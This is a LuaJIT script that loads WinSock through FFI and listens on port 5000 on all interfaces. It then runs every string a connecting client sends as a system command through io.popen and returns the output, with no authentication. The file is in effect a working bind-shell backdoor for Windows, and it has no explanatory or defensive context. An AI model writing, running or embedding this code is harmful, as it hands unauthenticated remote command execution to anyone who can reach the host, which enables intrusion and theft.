local ffi = require("ffi")
local io = require("io")

-- Load the WinSock DLL
local winsock = ffi.load("ws2_32")

-- Define WinSock constants and structures
ffi.cdef[[
    typedef int SOCKET;
    typedef unsigned long u_long;

    int WSACleanup();
    int WSAStartup(unsigned short wVersionRequested, struct WSAData* lpWSAData);
    SOCKET socket(int af, int type, int protocol);
    int bind(SOCKET s, const struct sockaddr* name, int namelen);
    int listen(SOCKET s, int backlog);
    SOCKET accept(SOCKET s, struct sockaddr* addr, int* addrlen);
    int send(SOCKET s, const char* buf, int len, int flags);
    int recv(SOCKET s, char* buf, int len, int flags);
    int closesocket(SOCKET s);

    uint16_t htons(uint16_t hostshort);
    uint32_t htonl(uint32_t hostlong);
    uint32_t inet_addr(const char* cp);

    struct in_addr {
        uint32_t s_addr;
    };

    struct sockaddr_in {
        short sin_family;
        unsigned short sin_port;
        struct in_addr sin_addr;
        char sin_zero[8];
    };

    struct sockaddr {
        unsigned short sa_family;
        char sa_data[14];
    };

    struct WSAData {
        uint16_t wVersion;
        uint16_t wHighVersion;
        char szDescription[256];
        char szSystemStatus[128];
        uint16_t iMaxSockets;
        uint16_t iMaxUdpDg;
        char* lpVendorInfo;
    };
]]

local AF_INET = 2
local SOCK_STREAM = 1
local IPPROTO_TCP = 6
local INVALID_SOCKET = -1

-- Initialize WinSock
local wVersionRequested = 0x0202
local wsaData = ffi.new("struct WSAData")
if winsock.WSAStartup(wVersionRequested, wsaData) ~= 0 then
    print("WSAStartup failed")
    return
end

-- Create a socket
local serverSocket = winsock.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)

if serverSocket == INVALID_SOCKET then
    print("Error creating socket")
    winsock.WSACleanup()
    return
end

-- Bind to a specific port
local serverAddress = ffi.new("struct sockaddr_in")
serverAddress.sin_family = AF_INET
serverAddress.sin_addr.s_addr = winsock.inet_addr("0.0.0.0") -- Bind to all available network interfaces
serverAddress.sin_port = winsock.htons(5000) -- Port 5000

-- Bind socket
if winsock.bind(serverSocket, ffi.cast("struct sockaddr*", serverAddress), ffi.sizeof("struct sockaddr_in")) == -1 then
    print("Error binding to address")
    winsock.WSACleanup()
    return
end

-- Listen for incoming connections
if winsock.listen(serverSocket, 5) == -1 then
    print("Error listening for incoming connections")
    winsock.WSACleanup()
    return
end

print("Server is listening on port 5000")

-- Accept incoming connections
local clientSocket = winsock.accept(serverSocket, nil, nil)
if clientSocket == INVALID_SOCKET then
    print("Error accepting incoming connection")
    winsock.WSACleanup()
    return
end

-- Interactive command loop
local bufSize = 1024
local buffer = ffi.new("char[?]", bufSize)

while true do
    -- Receive a command from the client
    local receivedBytes = winsock.recv(clientSocket, buffer, bufSize, 0)
    if receivedBytes <= 0 then
        print("Error receiving data or connection closed")
        break
    end

    -- Convert received bytes to a Lua string
    local command = ffi.string(buffer, receivedBytes)

    -- Execute the command in the command prompt
    local file = io.popen(command)
    local output = file:read("*a")
    file:close()

    -- Send the command output to the client
    local sentBytes = winsock.send(clientSocket, output, #output, 0)
    if sentBytes == -1 then
        print("Error sending data")
        break
    end
end

-- Close the client socket
winsock.closesocket(clientSocket)

-- Cleanup WinSock
winsock.WSACleanup()

